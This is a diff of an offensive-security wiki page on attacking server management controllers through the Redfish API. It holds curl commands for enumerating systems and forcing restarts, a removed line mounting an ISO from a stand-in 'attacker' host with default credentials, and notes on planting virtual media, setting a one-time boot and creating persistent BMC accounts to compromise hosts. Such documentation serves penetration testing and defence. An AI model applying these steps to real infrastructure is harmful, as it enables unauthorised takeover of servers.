@@ -15,25 +15,24 @@ keywords:
 Redfish is the DMTF-standardised REST/JSON API that modern BMCs (iDRAC, iLO, Supermicro, OpenBMC) expose over HTTPS, intended to replace the legacy IPMI interface. For an attacker it is the clean, scriptable control plane: authenticated with default or recovered credentials (or reached via an authentication flaw), it reads full hardware inventory and performs the host-compromising operations, querying and changing power state, setting the one-time boot device, creating and modifying BMC accounts, and attaching virtual media. It delivers the same impact as the IPMI attacks through a well-documented API, which makes it convenient for enumeration and automation across many controllers.
 
 ```bash
-# unauthenticated service root reveals structure/version
+# discover the service root and authenticate with authorized test credentials
 curl -sk https://<bmc>/redfish/v1/
-# authenticate (default/recovered creds) and enumerate
-curl -sk -u root:calvin https://<bmc>/redfish/v1/Systems/
-# control the host: power and one-time boot
-curl -sk -u root:calvin -X POST https://<bmc>/redfish/v1/Systems/System.Embedded.1/Actions/ComputerSystem.Reset \
+rf_base='https://<bmc>'; rf_creds='<user>:<password>'
+# enumerate instance URIs instead of assuming vendor-specific identifiers
+curl -sk -u "$rf_creds" "$rf_base/redfish/v1/Systems/" | jq -r '.Members[]."@odata.id"'
+# retrieve a chosen system and discover its advertised action target and allowed values
+curl -sk -u "$rf_creds" "$rf_base<system-uri>" | jq '.Actions, .Boot, .VirtualMedia'
+# invoke the exact reset target advertised by that resource
+curl -sk -u "$rf_creds" -X POST "$rf_base<advertised-reset-target>" \
   -H 'Content-Type: application/json' -d '{"ResetType":"ForceRestart"}'
-# attach virtual media (mount an attacker ISO) and boot from it
-curl -sk -u root:calvin -X POST https://<bmc>/redfish/v1/Managers/.../VirtualMedia/CD/Actions/VirtualMedia.InsertMedia \
-  -d '{"Image":"http://attacker/evil.iso"}'
-# create a persistent admin BMC account via the Accounts collection
 ```
 
 ## Exploitation notes
 
-- Redfish is the scriptable equivalent of the IPMI/vendor attacks: with credentials it reads inventory and drives power, boot, accounts, and virtual media across controllers uniformly, ideal for fleet-wide automation.
+- Redfish standardizes schemas and discovery, but resource instance URIs, supported actions, allowable values, and required privileges vary. Traverse `@odata.id` links and use each resource's advertised action target rather than hardcoding a vendor path.
 - The highest-impact action is the same as elsewhere, attach attacker virtual media and set a one-time boot to compromise the host OS; power/boot control and account creation support that and persistence.
 - Credentials come from [defaults](bmc-default-credentials.md), [cracked RAKP hashes](ipmi-rakp-hash-disclosure.md), or a controller [exploit](idrac-and-ilo.md); some Redfish implementations have also had their own authentication-bypass flaws, so test the service root and version.
-- The unauthenticated `/redfish/v1/` root leaks structure and firmware version for fingerprinting even before credentials.
+- The service root may expose basic version and resource links without authentication; verify the actual response rather than assuming detailed firmware information is anonymous.
 
 ## References
 
